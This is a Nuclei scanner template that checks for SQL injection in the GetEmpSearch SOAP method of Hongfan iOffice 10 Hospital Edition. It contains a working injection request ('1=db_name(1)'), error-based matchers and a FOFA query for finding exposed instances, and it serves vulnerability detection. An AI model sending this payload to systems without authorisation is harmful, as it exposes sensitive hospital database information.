nuclei-v3/H/hongfan-ioffice-sqli.yaml

http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'System.Data.SqlClient.SqlException:'
    - nvarchar
  - part: header
    type: word
    words:
    - text/xml
  - status:
    - 500
    type: status
  matchers-condition: and
  raw:
  - "POST /iOffice/prg/set/wss/udfmr.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ text/xml; charset=utf-8\nSOAPAction: http://tempuri.org/ioffice/udfmr/GetEmpSearch\n\
    \n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    >\n  <soap:Body>\n    <GetEmpSearch xmlns=\"http://tempuri.org/ioffice/udfmr\"\
    >\n      <condition>1=db_name(1)</condition>\n    </GetEmpSearch>\n  </soap:Body>\n\
    </soap:Envelope>\n"
id: hongfan-ioffice-sqli
info:
  author: SleepingBag945
  description: 'There is a SQL injection vulnerability in Hongfan iOffice 10 Hospital
    Edition, which can be exploited by attackers to obtain sensitive database information.

    '
  metadata:
    fofa-query: "app=\"\u7EA2\u5E06-ioffice\""
    max-request: 1
    verified: true
  name: Hongfan OA udfmr.asmx - SQL injection
  reference:
  - https://github.com/lal0ne/vulnerability/blob/main/%E7%BA%A2%E5%B8%86OA/iOffice_sqlscan/sql.py
  - https://github.com/MrWQ/vulnerability-paper/blob/master/bugs/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%BA%A2%E5%B8%86%E5%8C%BB%E7%96%97%E4%BA%91%20OA%20udfmr.asmx%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  severity: high
  tags: hongfan,oa,sqli
